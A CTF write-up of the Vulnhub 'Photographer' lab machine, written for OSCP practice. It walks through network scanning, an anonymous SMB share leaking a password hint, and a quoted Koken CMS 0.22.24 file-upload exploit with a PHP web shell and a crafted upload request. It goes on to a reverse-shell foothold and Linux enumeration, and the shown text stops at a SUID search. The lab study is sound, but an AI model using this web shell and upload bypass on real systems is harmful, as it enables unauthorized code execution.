---
title: Write-up Photographer on Vulnhub
author: eMVee
date: 2023-03-08 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, suid]
render_with_liquid: false
---

While preparing for the OSCP exam, you have to gain more experience in hacking and building your methodology to pass the exam. There is a well known list created by TJnull with all kind of vulnerable machines. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/photographer-1,519/). After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine. As soon as everything has been configured in the virtual environment, it is time to start.


## Getting started
Let's check our IP address on Kali first.

```bash
┌──(emvee㉿kali)-[~]
└─$ myip

    inet 127.0.0.1
    inet 10.0.2.15
```
We can run arp-scan to identify other devices on our network.
```bash
┌──(emvee㉿kali)-[~]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:32:47:78       PCS Systemtechnik GmbH
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.26       08:00:27:ee:a0:2a       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.203 seconds (116.21 hosts/sec). 4 responded
```
There is a new IP address within our virtual network. To be sure of this IP address we can run fping to run a ping sweep on our subnet.
```bash
┌──(emvee㉿kali)-[~]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.26

```
Almost forgotten to create a working directory for our vulnerable machine.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/Vulnhub  

┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd Photographer

```
Now we should make our life easier by creating a variable containing the IP address of the vulnerable machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ ip=10.0.2.26
```
Since everything is set we can start enumerating.


----

## Enumeration

Let's try to run a ping request to see if the machine will respond to this.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ ping $ip -c 3
PING 10.0.2.26 (10.0.2.26) 56(84) bytes of data.
64 bytes from 10.0.2.26: icmp_seq=1 ttl=64 time=0.425 ms
64 bytes from 10.0.2.26: icmp_seq=2 ttl=64 time=1.02 ms
64 bytes from 10.0.2.26: icmp_seq=3 ttl=64 time=1.04 ms

--- 10.0.2.26 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2023ms
rtt min/avg/max/mdev = 0.425/0.825/1.037/0.283 ms

```
Based on the ttl value (64) we could indicate that this machine is probably a Linux machine.
Now let's run an easy nmap scan request.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ nmap -T4 -Pn $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 17:08 CET
Nmap scan report for 10.0.2.26
Host is up (0.00023s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds

```
Some ports are identified as open, so we should add these to our notes.

* Port 80
	* HTTP?
* Port 139 / 445
	* SMB
* Port 8000
	* HTTP?

While the extensive nmap port scan has been started, it is wise to use whatweb in another terminal window to identify certain techniques.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ whatweb http://$ip
http://10.0.2.26 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.0.2.26], JQuery, Script, Title[Photographer by v1n1v131r4]

```
We can Identify some technologies used on this webserver.
* Ubuntu
* Apache 2.4.18

After this it's time to turn on Nikto to see if we can identify anything more on port 80.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ nikto -h http://$ip             
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.26
+ Target Hostname:    10.0.2.26
+ Target Port:        80
+ Start Time:         2023-03-07 17:10:47 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 164f, size: 5aaf04d7cd1a0, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2023-03-07 17:12:11 (GMT1) (84 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Besided some directory indexing and a default file there was nothing interesting for the moment. In the meanwhile nmap did finishe the extended port scan.


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ sudo nmap -sC -sV -T4 -A -p- $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 17:08 CET
Nmap scan report for 10.0.2.26
Host is up (0.00080s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: daisa ahomi
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Koken 0.22.24
MAC Address: 08:00:27:EE:A0:2A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h40m04s, deviation: 2h53m12s, median: 4s
| smb2-time: 
|   date: 2023-03-07T16:09:09
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2023-03-07T11:09:09-05:00
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.80 ms 10.0.2.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.02 seconds

```
Now we can see some more useful information such as samba version, a NetBIOS name for the computer, the website generator version used for the webserver on port 8000.
Now let's enumerate port 8000, since this looks interesting to me.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ whatweb http://$ip:8000
http://10.0.2.26:8000 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.0.2.26], JQuery[1.12.4], Meta-Author[daisa ahomi], MetaGenerator[Koken 0.22.24], Script, Title[daisa ahomi], X-UA-Compatible[IE=edge]

```
Let's add the following data to our notes:
* Koken 0.22.24
* Meta-Author : daisa ahomi

Let's check the website on port 80 first
![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307171542.png){: width="700" height="400" }


![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307171634.png){: width="700" height="400" }


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ searchsploit koken                 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                                                                                                                                                 | php/webapps/48706.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
 
```


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ searchsploit -m 48706              
  Exploit: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
      URL: https://www.exploit-db.com/exploits/48706
     Path: /usr/share/exploitdb/exploits/php/webapps/48706.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/emvee/Documents/Vulnhub/Photographer/48706.txt


                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ cat 48706.txt                      
# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
# Date: 2020-07-15
# Exploit Author: v1n1v131r4
# Vendor Homepage: http://koken.me/
# Software Link: https://www.softaculous.com/apps/cms/Koken
# Version: 0.22.24
# Tested on: Linux
# PoC: https://github.com/V1n1v131r4/Bypass-File-Upload-on-Koken-CMS/blob/master/README.md

The Koken CMS upload restrictions are based on a list of allowed file extensions (withelist), which facilitates bypass through the handling of the HTTP request via Burp.

Steps to exploit:

1. Create a malicious PHP file with this content:

   <?php system($_GET['cmd']);?>

2. Save as "image.php.jpg"

3. Authenticated, go to Koken CMS Dashboard, upload your file on "Import Content" button (Library panel) and send the HTTP request to Burp.

4. On Burp, rename your file to "image.php"


POST /koken/api.php?/content HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://target.com/koken/admin/
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------2391361183188899229525551
Content-Length: 1043
Connection: close
Cookie: PHPSESSID= [Cookie value here]

-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="name"

image.php
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunk"

0
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="chunks"

1
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="upload_session_start"

1594831856
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="visibility"

public
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="license"

all
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="max_download"

none
-----------------------------2391361183188899229525551
Content-Disposition: form-data; name="file"; filename="image.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']);?>

-----------------------------2391361183188899229525551--



5. On Koken CMS Library, select you file and put the mouse on "Download File" to see where your file is hosted on server.
```


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ nikto -h http://$ip:8000
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.26
+ Target Hostname:    10.0.2.26
+ Target Port:        8000
+ Start Time:         2023-03-07 17:13:09 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-koken-cache' found, with contents: hit
+ All CGI directories 'found', use '-C none' to test none
+ Server may leak inodes via ETags, header found with file /, inode: 1264, size: 5f651a1f06701, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'x-xhr-current-location' found, with contents: http://10.0.2.26/
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /app/: This might be interesting...
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ /server-status: Apache server-status interface found (protected/forbidden)
+ 26547 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2023-03-07 17:18:10 (GMT1) (301 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```



![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307173738.png){: width="700" height="400" }

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ smbmap -H $ip -v                
[+] 10.0.2.26:445 is running Windows 6.1 Build 0 (name:PHOTOGRAPHER) (domain:PHOTOGRAPHER)
```

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ smbmap -H $ip   
[+] Guest session       IP: 10.0.2.26:445       Name: 10.0.2.26                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        sambashare                                              READ ONLY       Samba on Ubuntu
        IPC$                                                    NO ACCESS       IPC Service (photographer server (Samba, Ubuntu))
    
```


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ smbclient \\\\$ip\\sambashare -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 03:30:07 2020
  ..                                  D        0  Tue Jul 21 11:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 03:22:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt 
getting file \mailsent.txt of size 503 as mailsent.txt (12.3 KiloBytes/sec) (average 12.3 KiloBytes/sec)
smb: \> get wordpress.bkp.zip 
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (97869.1 KiloBytes/sec) (average 76001.7 KiloBytes/sec)
smb: \> exit

```

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ cat mailsent.txt    
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)

```
There are two email addresses in the email. Perhaps one of them might be used for the website koken.

* daisa@photographer.com
* agi@photographer.com

So one of the words would be probably the password.


![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307175354.png){: width="700" height="400" }

```password
babygirl
```

------
## Initial access

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307175646.png){: width="700" height="400" }



```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ cp shell.php shell.php.jpg  
```

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191052.png){: width="700" height="400" }


![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191117.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191200.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191234.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191307.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191342.png){: width="700" height="400" }

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ nc -lvp 1234                      
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191512.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307191755.png){: width="700" height="400" }

![Image](/assets/img/WriteUp/Vulnhub/Photographer/Pasted image 20230307192115.png){: width="700" height="400" }

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ nc -lvp 1234                      
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.2.26.
Ncat: Connection from 10.0.2.26:49152.
Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 13:20:46 up  1:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```


```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
www-data@photographer:/$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
</usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
```

```bash
www-data@photographer:/$ export TERM=xterm-256color  
export TERM=xterm-256color  
```

```bash
www-data@photographer:/$ alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'  
```

```bash
www-data@photographer:/$ ^Z
zsh: suspended  nc -lvp 1234
```

```
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Photographer]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  nc -lvp 1234

www-data@photographer:/$ stty columns 200 rows 200

```

Since we have upgraded our shell, we should check who we are and on what machine we are working.
```bash
www-data@photographer:/$ whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
photographer
```
It looks like we are running the commands as `www-data` on this machine. Now we should gather some information from this machine.
Let's start with enumerating the Linux distro version and architecture. This might be useful information if we need to search for an exploit or if we might have to compile something first.
```bash
www-data@photographer:/$ uname -a
Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
www-data@photographer:/$ uname -mrs
Linux 4.15.0-45-generic x86_64
www-data@photographer:/$ cat /etc/issue
Ubuntu 16.04.6 LTS \n \l
www-data@photographer:/$ cat /proc/version
Linux version 4.15.0-45-generic (buildd@lcy01-amd64-027) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10)) #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019
www-data@photographer:/$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
www-data@photographer:/$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.6 LTS
Release:        16.04
Codename:       xenial
```
From the commands we could identify some useful information what we should add to our notes:
- Ubuntu 16.04.6 LTS
- Linux 4.15.0-45-generic x86_64

Now we should enumerate the users what can be found in `/etc/passwd`.
```bash
www-data@photographer:/$ cat /etc/passwd | cut -d: -f1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-timesync
systemd-network
systemd-resolve
systemd-bus-proxy
syslog
_apt
messagebus
uuidd
lightdm
whoopsie
avahi-autoipd
avahi
dnsmasq
colord
speech-dispatcher
hplip
kernoops
pulse
rtkit
saned
usbmux
agi
daisa
mysql
www-data@photographer:/$ 

```
It looks like there are two users in the `/etc/passwd` file.
Let's enumerate all home directories, including all files of all home directories of the users located in `/home`.
```bash
www-data@photographer:/$ ls -ahlR /home
/home:
total 32K
drwxr-xr-x  5 root  root  4.0K Jul 20  2020 .
drwxr-xr-x 24 root  root  4.0K Feb 28  2019 ..
drwxr-xr-x 17 agi   agi   4.0K Jul 21  2020 agi
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 daisa
drwx------  2 root  root   16K Feb 28  2019 lost+found

/home/agi:
total 120K
drwxr-xr-x 17 agi  agi  4.0K Jul 21  2020 .
drwxr-xr-x  5 root root 4.0K Jul 20  2020 ..
-rw-------  1 agi  agi  1.3K Jul 21  2020 .ICEauthority
-rw-------  1 agi  agi   109 Jul 21  2020 .Xauthority
-rw-------  1 agi  agi    35 Jul 21  2020 .bash_history
-rw-r--r--  1 agi  agi   220 Jul 20  2020 .bash_logout
-rw-r--r--  1 agi  agi  3.7K Jul 20  2020 .bashrc
drwx------ 14 agi  agi  4.0K Jul 21  2020 .cache
drwx------ 14 agi  agi  4.0K Jul 20  2020 .config
-rw-r--r--  1 agi  agi    25 Jul 20  2020 .dmrc
drwx------  2 agi  agi  4.0K Jul 20  2020 .gconf
drwx------  3 agi  agi  4.0K Jul 21  2020 .gnupg
drwx------  3 agi  agi  4.0K Jul 20  2020 .local
drwx------  5 agi  agi  4.0K Jul 20  2020 .mozilla
-rw-r--r--  1 agi  agi   655 Jul 20  2020 .profile
-rw-------  1 agi  agi   845 Jul 21  2020 .viminfo
-rw-------  1 agi  agi  1.4K Jul 21  2020 .xsession-errors
-rw-------  1 agi  agi  1.3K Jul 20  2020 .xsession-errors.old
drwxr-xr-x  2 agi  agi  4.0K Jul 20  2020 Desktop
drwxr-xr-x  2 agi  agi  4.0K Jul 20  2020 Documents
drwxr-xr-x  2 agi  agi  4.0K Jul 21  2020 Downloads
drwxr-xr-x  2 agi  agi  4.0K Jul 20  2020 Music
drwxr-xr-x  2 agi  agi  4.0K Jul 20  2020 Pictures
drwxr-xr-x  2 agi  agi  4.0K Jul 20  2020 Public
drwxr-xr-x  2 agi  agi  4.0K Jul 20  2020 Templates
drwxr-xr-x  2 agi  agi  4.0K Jul 20  2020 Videos
-rw-r--r--  1 agi  agi  8.8K Jul 20  2020 examples.desktop
drwxr-xr-x  2 root root 4.0K Jul 20  2020 share
ls: cannot open directory '/home/agi/.cache': Permission denied
ls: cannot open directory '/home/agi/.config': Permission denied
ls: cannot open directory '/home/agi/.gconf': Permission denied
ls: cannot open directory '/home/agi/.gnupg': Permission denied
ls: cannot open directory '/home/agi/.local': Permission denied
ls: cannot open directory '/home/agi/.mozilla': Permission denied

/home/agi/Desktop:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/Documents:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/Downloads:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 21  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/Music:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/Pictures:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/Public:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/Templates:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/Videos:
total 8.0K
drwxr-xr-x  2 agi agi 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi agi 4.0K Jul 21  2020 ..

/home/agi/share:
total 14M
drwxr-xr-x  2 root root 4.0K Jul 20  2020 .
drwxr-xr-x 17 agi  agi  4.0K Jul 21  2020 ..
-rw-r--r--  1 root root  503 Jul 20  2020 mailsent.txt
-rw-rw-r--  1 agi  agi   14M Jul 20  2020 wordpress.bkp.zip

/home/daisa:
total 112K
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 .
drwxr-xr-x  5 root  root  4.0K Jul 20  2020 ..
-rw-------  1 daisa daisa  966 Jul 20  2020 .ICEauthority
-rw-------  1 daisa daisa   52 Jul 20  2020 .Xauthority
-rw-r--r--  1 daisa daisa  220 Feb 28  2019 .bash_logout
-rw-r--r--  1 daisa daisa 3.7K Feb 28  2019 .bashrc
drwx------ 11 daisa daisa 4.0K Jul 20  2020 .cache
drwx------  3 daisa daisa 4.0K Feb 28  2019 .compiz
drwx------ 14 daisa daisa 4.0K Jul 20  2020 .config
-rw-r--r--  1 daisa daisa   25 Feb 28  2019 .dmrc
drwx------  2 daisa daisa 4.0K Jul 20  2020 .gconf
drwx------  3 daisa daisa 4.0K Jul 20  2020 .gnupg
drwx------  3 daisa daisa 4.0K Feb 28  2019 .local
-rw-r--r--  1 daisa daisa  655 Feb 28  2019 .profile
-rw-r--r--  1 daisa daisa    0 Jul 20  2020 .sudo_as_admin_successful
-rw-------  1 daisa daisa  681 Jul 20  2020 .xsession-errors
-rw-------  1 daisa daisa 1.7K Jul 20  2020 .xsession-errors.old
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Desktop
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Documents
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Downloads
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Music
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Pictures
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Public
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Templates
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 Videos
-rw-r--r--  1 daisa daisa 8.8K Feb 28  2019 examples.desktop
-rwxrwxr-x  1 root  root    33 Jul 20  2020 user.txt
ls: cannot open directory '/home/daisa/.cache': Permission denied
ls: cannot open directory '/home/daisa/.compiz': Permission denied
ls: cannot open directory '/home/daisa/.config': Permission denied
ls: cannot open directory '/home/daisa/.gconf': Permission denied
ls: cannot open directory '/home/daisa/.gnupg': Permission denied
ls: cannot open directory '/home/daisa/.local': Permission denied

/home/daisa/Desktop:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..

/home/daisa/Documents:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..

/home/daisa/Downloads:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..

/home/daisa/Music:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..

/home/daisa/Pictures:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..

/home/daisa/Public:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..

/home/daisa/Templates:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..

/home/daisa/Videos:
total 8.0K
drwxr-xr-x  2 daisa daisa 4.0K Feb 28  2019 .
drwxr-xr-x 16 daisa daisa 4.0K Jul 20  2020 ..
ls: cannot open directory '/home/lost+found': Permission denied

```
The user flag is under `/home/daisa` and has the permission to be read by everyone:
`-rwxrwxr-x  1 root  root    33 Jul 20  2020 user.txt`
Now let's capture the user flag first before we continue with the path to privilege escalation.
```bash
www-data@photographer:/$ cat /home/daisa/user.txt
d41d8cd98f00b204e9800998ecf8427e

```
First let's check quick if there are files with a SUID bit. If we can find one, we might be able to escalate our privileges to root.
We can find SUID files by running the following command: `find / -perm -u=s -type f 2>/dev/null`
```bash
www-data@photographer:/$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
